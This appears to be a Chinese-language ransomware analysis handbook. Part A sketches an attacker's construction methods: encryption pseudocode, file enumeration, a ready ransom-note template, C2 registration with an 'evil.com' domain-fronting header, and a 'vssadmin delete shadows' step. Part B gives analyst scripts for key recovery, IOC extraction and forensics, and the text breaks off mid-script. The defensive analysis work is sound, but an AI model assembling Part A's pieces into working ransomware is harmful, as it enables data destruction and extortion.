---
name: reverse-engineering-ransomware
description: >
  Complete ransomware analysis covering encryption routine reverse engineering,
  cryptographic weakness identification, network indicator extraction,
  attack artifact investigation, leak site intelligence gathering,
  and cryptocurrency payment tracing for attribution.
  Part A covers ransomware construction TTPs;
  Part B covers analyst workflows for decryption, attribution, and incident response.
domain: cybersecurity
subdomain: reverse-engineering
tags: [ransomware, encryption, crypto-analysis, network-indicators, leak-site, cryptocurrency, attribution, decryption, ransomware-analysis]
version: 2.0.0
---

# Ransomware Reverse Engineering — Complete Handbook

## 适用场景

- 分析勒索软件加密流程并评估解密可能性
- 从勒索软件二进制中提取 C2 地址、密钥服务器、网络 IOC
- 追踪加密货币支付流向以进行归因分析
- 调查勒索事件残留的攻击工件并还原攻击时间线
- 监控暗网泄漏站点以获取威胁情报
- 识别勒索软件家族、检测重品牌操作、编写 YARA 检测规则

**不适用**：通用恶意软件动态分析（见 malware-analysis-dynamic）、内存取证（见 malware-analysis-memory）

## 前置条件

- IDA Pro 8.x（含 Hex-Rays）或 Ghidra 10.x+
- x64dbg / WinDbg（动态调试）
- Wireshark / NetworkMiner（网络流量分析）
- Python 3.x（自动化脚本、区块链分析）
- Volatility 3（内存取证）
- 了解 Windows CryptoAPI / OpenSSL 常见调用模式
- 了解 PE 文件格式与 x86/x64 汇编

---

## Part A：攻击者视角 — 勒索软件构建技术

### 1. 加密方案设计

#### 1.1 混合加密架构 (RSA + AES)

现代勒索软件统一采用混合加密：每个文件用随机对称密钥加密，对称密钥用嵌入的 RSA/ECC 公钥加密后附加在文件尾部。私钥仅存在于攻击者 C2 服务器。

```c
// === 勒索软件加密核心流程（概念性伪代码） ===

// 1. 启动时生成全局 RSA-2048 密钥对（部分家族直接用硬编码公钥）
//    先进家族：生成 ECC (Curve25519) 密钥对，用硬编码公钥加密私钥后上传 C2

// 2. 每个文件独立的加密流程
void encrypt_file(const char* filepath, RSA* embedded_pubkey) {
    // 2a. 生成随机 AES-256 密钥
    BYTE aes_key[32];
    BCryptGenRandom(NULL, aes_key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    // 2b. 用 AES-256-CBC 加密文件内容
    //     高性能实现：仅加密文件头部 1-5MB（快速加密，增大恢复难度）
    size_t encrypt_size = min(filesize, 5 * 1024 * 1024);
    aes_cbc_encrypt(file_data, aes_key, iv, encrypt_size);

    // 2c. 用 RSA 公钥加密 AES 密钥
    BYTE encrypted_key[512];  // RSA-4096 输出 512 字节
    RSA_public_encrypt(sizeof(aes_key), aes_key, encrypted_key,
                       embedded_pubkey, RSA_PKCS1_PADDING);

    // 2d. 将加密后的密钥 + 原始文件大小追加到文件尾部
    //     格式：[encrypted_key_len(2B)][encrypted_key][iv(16B)][magic(4B)]
    append_to_file(filepath, encrypted_key, iv, magic_bytes);

    // 2e. 重命名文件（添加扩展名如 .locked, .encrypt, .xxx）
    rename_with_extension(filepath, ".encrypted");
}
```

#### 1.2 密钥管理方式对比

| 方式 | 说明 | 代表家族 | 分析难点 |
|------|------|----------|----------|
| 硬编码公钥 | 公钥编译进二进制 | WannaCry, Petya | 静态提取公钥即可分析 |
| C2 动态下发 | 首次连接获取公钥 | LockBit 3.0 | 需拦截网络通信 |
| 本地生成+ECC | 本地生成 Curve25519 对，公钥加密私钥上传 | BlackCat/ALPHV | 私钥不落盘，内存取证窗口极短 |
| 分层密钥 | 主密钥加密会话密钥 | Conti | 需还原完整密钥链 |

#### 1.3 文件枚举与加密策略

```c
// === 文件枚举策略 ===

// 1. 目标驱动器枚举
void enumerate_drives() {
    DWORD drives = GetLogicalDrives();
    for (char letter = 'A'; letter <= 'Z'; letter++) {
        if (drives & (1 << (letter - 'A'))) {
            char root[] = "X:\\";
            root[0] = letter;
            UINT type = GetDriveType(root);
            // DRIVE_FIXED: 本地磁盘（必加密）
            // DRIVE_REMOTE: 网络共享（必加密，横向扩散）
            // DRIVE_REMOVABLE: USB等（选择性加密）
            // DRIVE_CDROM: 跳过
        }
    }
}

// 2. 排除列表 — 不加密系统关键文件
const char* excluded_extensions[] = {
    ".exe", ".dll", ".sys", ".inf",       // 可执行文件
    ".ini", ".lst", ".log", ".cfg",       // 配置文件
    ".msi", ".cab", ".msc",               // 安装包
    NULL
};
const char* excluded_dirs[] = {
    "Windows", "Program Files", "Program Files (x)",
    "AppData\\Local\\Google", "AppData\\Local\\Microsoft",
    "$Recycle.Bin", "System Volume Information",
    NULL
};

// 3. 文件加密后重命名映射
const char* extension = NULL;  // 从配置或 C2 获取
// 常见命名模式：
//   [原文件名].[原扩展名].[家族特定扩展名]
//   [原文件名].[受害者ID].[家族扩展名]
//   [随机hex字符串].[家族扩展名]
```

#### 1.4 加密速度优化

```c
// === 多线程加密实现 ===
typedef struct {
    HANDLE  hFile;
    LARGE_INTEGER file_size;
    BYTE*   aes_key;
    BYTE*   iv;
    size_t  chunk_size;    // 通常 1MB
} ENCRYPT_TASK;

DWORD WINAPI encrypt_worker(LPVOID param) {
    ENCRYPT_TASK* task = (ENCRYPT_TASK*)param;
    BYTE* buffer = VirtualAlloc(NULL, task->chunk_size, MEM_COMMIT, PAGE_READWRITE);

    // 逐块读取-加密-写回
    size_t remaining = min(task->file_size.QuadPart, MAX_ENCRYPT_SIZE);
    while (remaining > 0) {
        size_t to_encrypt = min(remaining, task->chunk_size);
        ReadFile(task->hFile, buffer, to_encrypt, &bytes_read, NULL);
        aes_encrypt_inplace(buffer, to_encrypt, task->aes_key, task->iv);
        // 回写到原偏移
        SetFilePointerEx(task->hFile, &offset, NULL, FILE_BEGIN);
        WriteFile(task->hFile, buffer, to_encrypt, &bytes_written, NULL);
        remaining -= to_encrypt;
    }
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}

// 创建线程池：通常等于 CPU 核心数
SYSTEM_INFO si; GetSystemInfo(&si);
for (int i = 0; i < si.dwNumberOfProcessors; i++) {
    CreateThread(NULL, 0, encrypt_worker, &tasks[i], 0, NULL);
}
```

#### 1.5 常见加密库与弱点

| 加密库 | 调用特征 | 常见弱点 |
|--------|----------|----------|
| Windows CryptoAPI | `CryptAcquireContext`, `CryptGenKey`, `CryptEncrypt` | ECB 模式误用、IV 固定为全零 |
| Windows CNG (BCrypt) | `BCryptOpenAlgorithmProvider`, `BCryptGenerateKeyPair` | 较少弱点，但密钥可能留内存 |
| OpenSSL (静态链接) | `AES_set_encrypt_key`, `RSA_public_encrypt` | 可通过签名识别版本和已知漏洞 |
| 自定义实现 | 无标准 API 调用 | 最易出错：ECB、硬编码密钥、弱 PRNG |
| tiny-AES-c | `AES_init_ctx`, `AES_CTR_xcrypt_buffer` | CTR 模式 nonce 重用风险 |

#### 1.6 已知弱点实现

```c
// === 常见加密弱点清单 ===

// 弱点 1：ECB 模式（块间无关联，相同明文产生相同密文）
//     检测：文件中重复出现的 16 字节密文块
AES_set_encrypt_key(key, 256, &aes_ctx);
AES_ecb_encrypt(plaintext, ciphertext, &aes_ctx, AES_ENCRYPT);

// 弱点 2：硬编码密钥（直接存储在 .data 或 .rdata 段）
//     检测：IDA 中搜索连续的高熵 16/32 字节数据
BYTE hardcoded_key[32] = {
    0x4E, 0x6F, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x54,
    0x6F, 0x53, 0x65, 0x65, 0x48, 0x65, 0x72, 0x65
    // ... 32 bytes
};

// 弱点 3：弱 PRNG（使用 srand/rand 或 GetTickCount 作为种子）
srand(GetTickCount());  // 可预测！
for (int i = 0; i < 32; i++) aes_key[i] = rand() % 256;

// 弱点 4：部分加密（仅加密文件头部）
//     检测：文件大部分内容为明文，仅前 N 字节被加密
//     利用：如密钥可恢复，仅解密头部即可恢复完整文件

// 弱点 5：密钥存储在内存/注册表不安全位置
//     检测：内存扫描或注册表监控
RegSetValueEx(hKey, "SessionData", 0, REG_BINARY, aes_key, 32);
```

### 2. 勒索信构建

```html
<!-- === 典型勒索信模板结构 === -->
<!DOCTYPE html>
<html>
<head><title>YOUR FILES ARE ENCRYPTED</title></head>
<body style="background:#1a1a2e;color:#e94560;font-family:monospace">
<h1>All your files have been encrypted!</h1>
<p>What happened to my computer?<br>
Your important files (documents, databases, backups) were encrypted
using a hybrid encryption scheme (AES-256 + RSA-4096).</p>

<h2>How to recover files:</h2>
<ol>
  <li>Download Tor Browser: <code>https://www.torproject.org</code></li>
  <li>Open this link in Tor Browser: <code>http://xxxxx.onion/xxxxx</code></li>
  <li>Enter your personal ID: <code>{VICTIM_ID}</code></li>
  <li>Follow payment instructions (Bitcoin only)</li>
</ol>

<h2>Free decryption guarantee:</h2>
<p>You can send us ONE file for free decryption as proof.
File must be less than 1MB and contain no valuable information.</p>

<h2>⚠ WARNING</h2>
<ul>
  <li>Do NOT modify encrypted files — this will corrupt them permanently</li>
  <li>Do NOT use third-party decryptors — they will destroy your files</li>
  <li>Payment deadline: {DEADLINE}. After that, price DOUBLES</li>
  <li>After {FINAL_DEADLINE}, your data will be published on our leak site</li>
</ul>
</body>
</html>
```

### 3. C2 通信架构

```python
# === C2 通信模式对比 ===

# 模式 1：Tor Hidden Service（最常见）
# 勒索软件内嵌 .onion 地址列表
ONION_GATEWAYS = [
    "http://victimportalxxx.onion/api/register",
    "http://backup-gatewayxxx.onion/api/register",
]
# 通过 Tor SOCKS5 代理发送
# socks5h://127.0.0.1:9050（需 Tor 运行或内嵌 Tor 客户端）

# 模式 2：HTTPS + 域前置（Domain Fronting）
import requests
# 使用合法 CDN 域名作为 SNI，实际请求 C2 路径
headers = {
    "Host": "cdn-actual-provider.example.com",  # 真实 CDN 域
    "X-Forwarded-Host": "actual-c2-path.evil.com"  # 隐藏 C2
}

# 模式 3：DNS 隧道（低带宽场景，用于密钥交换）
# 将加密密钥编码为 DNS 查询子域
# victim_id.encrypted_key_base64.c2domain.com -> A record response

# 模式 4：受害者注册流程（典型 API）
"""
POST /api/v1/victim/register HTTP/1.1
Content-Type: application/json

{
    "victim_id": "AB12-CD34-EF56",
    "hostname": "DESKTOP-ABC123",
    "os_version": "Windows 10 Pro 19045",
    "domain": "CORP.LOCAL",
    "encrypted_keys": [
        {"file_count": 1234, "enc_key": "base64...", "algorithm": "AES-256"},
        {"pub_key": "base64_ecc_public_key", "curve": "curve25519"}
    ],
    "ransom_note_language": "en"
}

Response 200:
{
    "payment_address": "bc1q...",
    "amount_btc": 0.45,
    "deadline_utc": "2025-01-15T00:00:00Z",
    "chat_url": "http://xxxxx.onion/chat/AB12-CD34-EF56"
}
"""
```

### 4. 数据泄漏基础设施

```
=== 勒索软件 RaaS 双重勒索模型 ===

阶段 1：数据窃取（加密前）
├── 工具：rclone, MegaSync, WinSCP, 自定义 exfil 工具
├── 目标：文档、数据库、财务记录、客户 PII
├── 传输：Mega.nz API, SSH/SFTP, OneDrive API, 自定义 HTTPS POST
└── 去重：基于文件哈希避免重复上传

阶段 2：数据加密（锁定系统）
├── 本地文件 + 网络共享 + NAS + 备份服务器
└── VSS 删除：vssadmin delete shadows /all /quiet

阶段 3：泄漏站点（未付赎金）
├── Tor Hidden Service 托管
├── 受害者页面：公司名、数据量、样本下载、倒计时
├── 拍卖平台：高价值数据（医疗/军事）拍卖给出价最高者
└── 全量数据包：过期后公开全部数据

阶段 4：SEO 与媒体运营
├── Twitter/X 账号宣传新受害者
├── 网络犯罪论坛帖子
└── 定制新闻稿发送给安全媒体
```

---

## Part B：分析师视角 — 勒索软件分析工作流

### 5. 加密流程逆向工程

#### 5.1 IDA Pro 工作流：定位加密算法

```
=== IDA Pro 加密算法定位步骤 ===

Step 1：字符串搜索
  Shift+F12 → 搜索以下关键字符串：
  - "CryptEncrypt", "BCryptEncrypt", "AES", "RSA"
  - ".locked", ".encrypted", ".crypt"（文件扩展名）
  - "YOUR FILES ARE ENCRYPTED"（勒索信片段）
  - 错误信息字符串 "Encryption failed", "Key generation error"

Step 2：导入表分析
  查看 Imports 窗口，定位：
  - CryptAcquireContextW / CryptGenKey / CryptEncrypt → CryptoAPI
  - BCryptOpenAlgorithmProvider / BCryptEncrypt → CNG
  - 若无任何加密导入 → 可能静态链接 OpenSSL 或自定义实现

Step 3：交叉引用追踪
  从 CryptEncrypt / BCryptEncrypt 交叉引用回溯：
  xref → 找到调用函数 → 分析参数
  重点：第 2 参数（密钥句柄）→ 追溯密钥来源

Step 4：识别常量（AES S-Box / RSA 素数）
  搜索 AES 特征常量：
  - S-Box 首字节：63 7C 77 7B F2 6B 6F C5
  - 轮常量：52 09 6A D5 30 36 A5 38
  搜索 RSA 特征：
  - Base64 编码的 "BEGIN RSA" 或密钥 blob
```

#### 5.2 Ghidra 工作流：自动化加密检测

```java
// === Ghidra Script：检测 AES S-Box 引用 ===
// @category Ransomware Analysis
import ghidra.app.script.GhidraScript;
import ghidra.program.model.mem.Memory;

public class FindAESSBox extends GhidraScript {
    // AES S-Box 前 16 字节
    byte[] sbox_start = {
        (byte)0x63, (byte)0x7C, (byte)0x77, (byte)0x7B,
        (byte)0xF2, (byte)0x6B, (byte)0x6F, (byte)0xC5,
        (byte)0x30, (byte)0x01, (byte)0x67, (byte)0x2B,
        (byte)0xFE, (byte)0xD7, (byte)0xAB, (byte)0x76
    };

    @Override
    public void run() throws Exception {
        println("=== AES S-Box Scanner ===");
        Memory mem = currentProgram.getMemory();
        var blocks = mem.getBlocks();

        for (var block : blocks) {
            if (block.isExecute()) continue;  // 跳过代码段，搜索数据段
            long size = block.getSize();
            long start = block.getStart().getOffset();

            for (long offset = 0; offset < size - 256; offset++) {
                byte[] buf = new byte[16];
                mem.getBytes(block.getStart().add(offset), buf);
                if (java.util.Arrays.equals(buf, sbox_start)) {
                    println(String.format("  [HIT] AES S-Box at 0x%s in block %s",
                        Long.toHexString(start + offset), block.getName()));
                    // 追踪引用
                    var refs = getReferencesTo(block.getStart().add(offset));
                    for (var ref : refs) {
                        println(String.format("    Referenced from: 0x%s",
                            Long.toHexString(ref.getFromAddress().getOffset())));
                    }
                }
            }
        }
        println("=== Scan Complete ===");
    }
}
```

#### 5.3 各家族加密模式速查

| 家族 | 对称算法 | 非对称算法 | 密钥大小 | 加密模式 | 文件尾部结构 | 已知解密器 |
|------|----------|------------|----------|----------|-------------|------------|
| WannaCry | AES-128-CBC | RSA-2048 | 128/2048 | CBC | [enc_key(256B)][IV(16B)] | Wanakiwi, WanaDecrypt |
| Ryuk | AES-256-ECB | RSA-4096 | 256/4096 | ECB | [enc_key(512B)] | 无（ECB 模式但 RSA-4096 安全） |
| Conti | AES-256-CBC | RSA-4096 | 256/4096 | CBC | [enc_key(512B)][IV(16B)][magic] | 无（密钥管理正确） |
| LockBit 3.0 | AES-256-CTR | RSA-2048/ECC | 256/2048 | CTR | [enc_key][nonce][tag] | 无 |
| BlackBasta | ChaCha20-Poly1305 | RSA-4096 | 256/4096 | Stream | [enc_key(512B)][nonce(12B)] | 无 |
| ALPHV/BlackCat | AES-256-CTR + ChaCha20 | RSA-4096/ECC | 256/4096 | CTR/Stream | [enc_key][metadata JSON] | 无 |
| STOP/Djvu | AES-256-ECB | RSA-2048 | 256/2048 | ECB | [enc_key(256B)] | 仅离线密钥版本 |
| Cerber | AES-256-CBC | RSA | 256/2048 | CBC | 自定义结构 | 无 |
| Magniber | AES-256-ECB | RSA-2048 | 256/2048 | ECB | [enc_key(256B)] | 部分版本 |
| Hive v2 | AES-256-CTR | RSA-2048 | 256/2048 | CTR | 自定义文件头 | 无（v1 有漏洞已修复） |

### 6. 解密可能性分析

#### 6.1 已知解密工具

| 工具 | 来源 | 覆盖家族 | 网址 |
|------|------|----------|------|
| Emsisoft Decryptor | Emsisoft | 100+ 家族 | emsisoft.com/ransomware-decryption-tools |
| Kaspersky RakhniDecryptor | Kaspersky | Rakhni, Agent, AutoIt | support.kaspersky.com/products |
| ID Ransomware | MalwareHunterTeam | 识别 1200+ 家族 | id-ransomware.malwarehunterteam.com |
| NoMoreRansom | EUROPOL + 多厂商 | 聚合所有已知解密器 | nomoreransom.org |
| Wanakiwi | Adrien Guinet | WannaCry (Win XP-7) | github.com/agal-radmin/wanakiwi |
| TeslaCrack | 多位研究者 | TeslaCrypt v0-v3 | github.com/Cisco-Talos |

#### 6.2 弱点利用：密钥恢复方法

```python
#!/usr/bin/env python3
"""
=== 勒索软件密钥恢复脚本 ===
利用常见实现弱点尝试恢复 AES 密钥
"""
import struct
import os
import winreg  # Windows only
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

def recover_keys_from_memory(dump_path, file_signature):
    """
    从内存转储中搜索 AES 密钥
    策略：定位加密文件尾部结构中的加密密钥，在内存中搜索对应明文密钥
    """
    # Step 1: 从加密文件尾部提取加密后的密钥
    with open("encrypted_sample.txt.locked", "rb") as f:
        f.seek(-272, 2)  # 假设结构: [enc_key(256B)][IV(16B)]
        enc_key = f.read(256)
        iv = f.read(16)

    # Step 2: 在内存转储中搜索 AES 密钥（高熵 32 字节序列）
    # 启发式：搜索紧邻文件魔数或特定标记附近的密钥数据
    BLOCK_SIZE = 4096
    candidates = []
    with open(dump_path, "rb") as f:
        while True:
            block = f.read(BLOCK_SIZE * 1024)  # 4MB 块
            if not block:
                break
            # 搜索密钥存储模式：
            # 很多勒索软件在 malloc 的密钥旁存储密钥长度 0x20 (32)
            for i in range(len(block) - 36):
                if block[i:i+4] == b'\x20\x00\x00\x00':  # 密钥长度 32 (little-endian)
                    key_candidate = block[i+4:i+36]
                    # 验证：用此密钥尝试解密文件头部
                    try:
                        cipher = AES.new(key_candidate, AES.MODE_CBC, iv)
                        decrypted = cipher.decrypt(enc_key[:16])
                        # 检查是否为有效明文
                        if all(32 <= b < 127 for b in decrypted):
                            candidates.append((i, key_candidate))
                            print(f"[+] Potential key at offset 0x{i:x}")
                    except Exception:
                        pass
    return candidates

def recover_keys_from_registry():
    """
    从 Windows 注册表搜索勒索软件存储的密钥
    常见位置：HKCU\Software, HKLM\Software 下的随机命名键
    """
    suspicious_keys = []
    for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            with winreg.OpenKey(hive, r"Software") as key:
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        # 检测可疑的随机命名子键
                        with winreg.OpenKey(key, subkey_name) as sk:
                            j = 0
                            while True:
                                try:
                                    name, value, val_type = winreg.EnumValue(sk, j)
                                    if val_type == winreg.REG_BINARY and len(value) in [16, 32, 64]:
                                        print(f"[!] Binary value in {subkey_name}\\{name}: {len(value)} bytes")
                                        suspicious_keys.append({
                                            'path': f"Software\\{subkey_name}\\{name}",
                                            'data': value,
                                            'size': len(value)
                                        })
                                    j += 1
                                except OSError:
                                    break
                        i += 1
                    except OSError:
                        break
        except OSError:
            pass
    return suspicious_keys

def check_shadow_copies():
    """检查 VSS 卷影副本是否仍存在"""
    import subprocess
    result = subprocess.run(
        ['vssadmin', 'list', 'shadows'],
        capture_output=True, text=True
    )
    if "No items" in result.stdout:
        print("[-] Shadow copies deleted by ransomware")
        return []
    else:
        print("[+] Shadow copies found!")
        print(result.stdout)
        return result.stdout

# 使用示例
if __name__ == "__main__":
    print("=== Ransomware Key Recovery Tool ===")
    print("[1] Checking registry for stored keys...")
    reg_keys = recover_keys_from_registry()
    print(f"    Found {len(reg_keys)} suspicious binary values")

    print("\n[2] Checking shadow copies...")
    check_shadow_copies()

    print("\n[3] For memory key recovery, provide dump path:")
    print("    recover_keys_from_memory('memory.dmp', None)")
```

### 7. 网络指标提取

#### 7.1 从二进制提取 C2 地址

```python
#!/usr/bin/env python3
"""
=== 勒索软件网络 IOC 提取脚本 ===
从 PE 二进制中提取 C2 地址、Tor .onion 地址、密钥服务器 URL
"""
import re
import struct
import pefile

def extract_network_iocs(filepath):
    """从 PE 文件提取所有网络相关 IOC"""
    pe = pefile.PE(filepath)

    # --- 字符串提取 ---
    raw_data = open(filepath, 'rb').read()

    # ASCII 字符串（最小长度 6）
    ascii_strings = re.findall(rb'[\x20-\x7e]{6,}', raw_data)
    # Unicode 字符串
    unicode_strings = re.findall(rb'(?:[\x20-\x7e]\x00){6,}', raw_data)

    iocs = {
        'onion_addresses': set(),
        'urls': set(),
        'ip_addresses': set(),
        'domains': set(),
        'email_addresses': set(),
        'bitcoin_addresses': set(),
        'base64_blobs': set(),
    }

    all_strings = ascii_strings + unicode_strings

    for s in all_strings:
        text = s.decode('ascii', errors='ignore')

        # .onion 地址（Tor Hidden Service）
        onions = re.findall(r'[a-z2-7]{16,56}\.onion(?:[:/][^\s"]*)?', text)
        iocs['onion_addresses'].update(onions)

        # HTTP(S) URL
        urls = re.findall(r'https?://[^\s"\'<>]+', text)
        iocs['urls'].update(urls)

        # IP 地址（排除 0.0.0.0 和 255.255.255.255）
        ips = re.findall(r'\b(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)\.){3}'
                         r'(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)\b', text)
        valid_ips = [ip for ip in ips if ip not in ('0.0.0.0', '255.255.255.255')]
        iocs['ip_addresses'].update(valid_ips)

        # 域名
        domains = re.findall(r'(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}', text)
        iocs['domains'].update(d for d in domains if d not in ('www.example.com',))

        # 邮箱地址
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
        iocs['email_addresses'].update(emails)

        # Bitcoin 地址
        btc = re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}', text)
        iocs['bitcoin_addresses'].update(btc)

    # --- 导入表分析（网络相关 DLL）---
    network_dlls = {'ws2_32.dll', 'wininet.dll', 'winhttp.dll', 'urlmon.dll'}
    print("\n[+] Network-related imports:")
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode().lower()
            if dll_name in network_dlls:
                for imp in entry.imports:
                    if imp.name:
                        print(f"    {dll_name}: {imp.name.decode()}")

    # 输出汇总
    print(f"\n=== IOC Summary ===")
    for category, values in iocs.items():
        if values:
            print(f"\n[{category}] ({len(values)} found)")
            for v in sorted(values):
                print(f"  {v}")

    return iocs

# 使用
if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        extract_network_iocs(sys.argv[1])
```

#### 7.2 网络协议逆向清单

```
=== 勒索软件网络通信逆向步骤 ===

1. 流量捕获
   - Wireshark 在隔离环境中捕获所有流量
   - 或使用 mitmproxy 作为代理拦截 HTTPS
   - 对于 Tor 流量：在 ENTRY 节点前捕获（如使用自定义 SOCKS 代理）

2. 协议识别
   - 检查目标端口：443(HTTPS), 80(HTTP), 53(DNS), 9001(Tor)
   - TLS 指纹：JA3/JA3S 哈希对比已知勒索软件
   - DNS 查询模式：DGA 域名、子域名编码

3. 密钥交换分析
   - DH 参数交换：搜索 Diffie-Hellman 常量
   - RSA 公钥传输：Base64 编码块
   - 混合方案：先交换非对称密钥，再用对称密钥加密数据

4. 数据解码
   - Base64 解码通信内容
   - JSON/XML 解析（现代勒索软件多用 JSON）
   - 自定义二进制协议：需要逆向序列化格式

5. 重放与模拟
   - 修改请求参数测试 C2 响应
   - 模拟受害 ID 注册流程
   - 提取密钥服务器 URL
```

### 8. 攻击工件调查

#### 8.1 Windows 事件日志时间线重建

```powershell
# === 勒索软件攻击时间线重建 PowerShell 脚本 ===

# 1. 初始访问时间线
Write-Host "`n=== Initial Access Timeline ==="
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4624, 4625  # 成功/失败登录
} -ErrorAction SilentlyContinue |
    Where-Object { $_.TimeCreated -gt (Get-Date).AddDays(-7) } |
    Select-Object TimeCreated,
        @{N='EventID';E={$_.Id}},
        @{N='User';E={$_.Properties[5].Value}},
        @{N='SourceIP';E={$_.Properties[18].Value}} |
    Sort-Object TimeCreated | Format-Table -AutoSize

# 2. 横向移动检测
Write-Host "`n=== Lateral Movement Indicators ==="
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4624
} -ErrorAction SilentlyContinue |
    Where-Object {
        $_.Properties[8].Value -eq 3 -or  # Network logon
        $_.Properties[8].Value -eq 10     # Remote interactive
    } |
    Select-Object TimeCreated,
        @{N='LogonType';E={$_.Properties[8].Value}},
        @{N='User';E={$_.Properties[5].Value}},
        @{N='SourceIP';E={$_.Properties[18].Value}} |
    Format-Table -AutoSize

# 3. VSS 删除检测
Write-Host "`n=== Volume Shadow Copy Deletion ==="
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'
    ID = 4104  # Script block logging
} -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'vssadmin|shadow|delete' } |
    Select-Object TimeCreated, Message |
    Format-List

# 4. 计划任务检查（持久化）
Write-Host "`n=== Suspicious Scheduled Tasks ==="
Get-ScheduledTask |
    Where-Object {
        $_.Actions.Execute -match 'powershell|cmd|wscript|cscript' -and
        $_.State -ne 'Disabled'
    } |
    Select-Object TaskName, TaskPath,
        @{N='Execute';E={$_.Actions.Execute}},
        @{N='Arguments';E={$_.Actions.Arguments}},
        @{N='Created';E{$_.Date}} |
    Format-Table -AutoSize

# 5. 文件加密时间线（基于文件修改时间）
Write-Host "`n=== Encryption Timeline (file modification spike) ==="
$encExt = ".locked", ".encrypted", ".crypt", ".locked_by_"  # 替换为实际扩展名
$files = Get-ChildItem -Path C:\ -Recurse -Include "*$encExt" -ErrorAction SilentlyContinue
$files | Group-Object { $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm") } |
    Sort-Object Count -Descending |
    Select-Object -First 20 Count, Name |
    Format-Table -AutoSize
Write-Host "Total encrypted files: $($files.Count)"
```

#### 8.2 注册表修改分析

```python
#!/usr/bin/env python3
"""
=== 勒索软件注册表工件分析 ===
"""
import winreg
from datetime import datetime

RANSOMWARE_REGISTRY_INDICATORS = {
    # Windows Defender 排除路径（勒索软件添加自身到排除列表）
    "Defender Exclusions": r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",

    # 系统还原禁用
    "SystemRestore Disable": r"SOFTWARE\Microsoft\Windows NT\SystemRestore",

    # UAC 禁用
    "UAC Disable": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",

    # 自动运行启用（USB 感染）
    "AutoRun Enable": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer",
}

def check_registry_indicators():
    """检查勒索软件常见注册表修改"""
    findings = []

    # 1. 检查 Windows Defender 排除路径
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths")
        i = 0
        while True:
            try:
                name, value, vtype = winreg.EnumValue(key, i)
                if vtype == winreg.REG_DWORD and value == 0:
                    findings.append({
                        'indicator': 'Defender Exclusion Added',
                        'path': name,
                        'risk': 'HIGH - 可能是勒索软件排除自身路径'
                    })
                i += 1
            except OSError:
                break
    except FileNotFoundError:
        pass

    # 2. 检查系统还原是否被禁用
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\SystemRestore")
        val, _ = winreg.QueryValueEx(key, "DisableSR")
        if val == 1:
            findings.append({
                'indicator': 'System Restore Disabled',
                'value': val,
                'risk': 'HIGH - 勒索软件通常禁用系统还原'
            })
    except (FileNotFoundError, OSError):
        pass

    # 3. 检查 UAC 设置
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
        val, _ = winreg.QueryValueEx(key, "EnableLUA")
        if val == 0:
            findings.append({
                'indicator': 'UAC Disabled',
                'value': val,
                'risk': 'MEDIUM - 部分勒索软件禁用 UAC'
            })
    except (FileNotFoundError, OSError):
        pass

    for f in findings:
        print(f"[{f['risk']}] {f['indicator']}: {f.get('path', f.get('value', ''))}")

    return findings
```

#### 8.3 勒索软件工件检查清单

| 工件类型 | 位置 | 提取方法 | 分析目的 |
|----------|------|----------|----------|
| 勒索信文件 | 桌面、用户目录、加密目录 | `Get-ChildItem -Recurse -Include *.txt,*.html` | 家族识别、C2 地址提取 |
| 加密文件样本 | 任意被加密目录 | 保留原始扩展名和内容 | 加密模式分析、尾部结构 |
| PowerShell 日志 | `Microsoft-Windows-PowerShell/Operational` | `Get-WinEvent` | 恶意脚本还原 |
| VSS 删除记录 | PowerShell 4104 事件 | 事件日志查询 | 攻击行为确认 |
| 计划任务 | `\Microsoft\Windows\TaskScheduler` | `Get-ScheduledTask` | 持久化检测 |
| Run/RunOnce 键 | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | 注册表枚举 | 自启动项 |
| Temp 目录文件 | `%TEMP%`, `%APPDATA%\Local\Temp` | 文件枚举 | 释放的载荷/工具 |
| RDP 日志 | `Microsoft-Windows-TerminalServices-LocalSessionManager` | 事件日志 | 横向移动时间线 |
| SMB 日志 | `Microsoft-Windows-SMBServer/Audit` | 事件日志 | 网络共享加密时间线 |
| Prefetch 文件 | `C:\Windows\Prefetch\*.pf` | 复制解析 (PECmd) | 执行时间线 |
| MFT 修改记录 | `$MFT` | 解析工具 (MFTECmd) | 文件创建/修改时间线 |
| USN Journal | `$Extend\$UsnJrnl` | FsUsnJournal 工具 | 文件系统变更记录 |
| Windows Defender 日志 | `C:\ProgramData\Microsoft\Windows Defender\Support` | MPLog 解析 | 检测/排除历史 |
|BITS 传输 | `Get-BitsTransfer` | PowerShell | 后台下载任务 |
| WMI 订阅 | `ROOT\Subscription` | WMI 查询 | 无文件持久化 |

### 9. 泄漏站点情报

#### 9.1 Tor 泄漏站点监控方法

```python
#!/usr/bin/env python3
"""
=== 勒索软件泄漏站点监控框架 ===
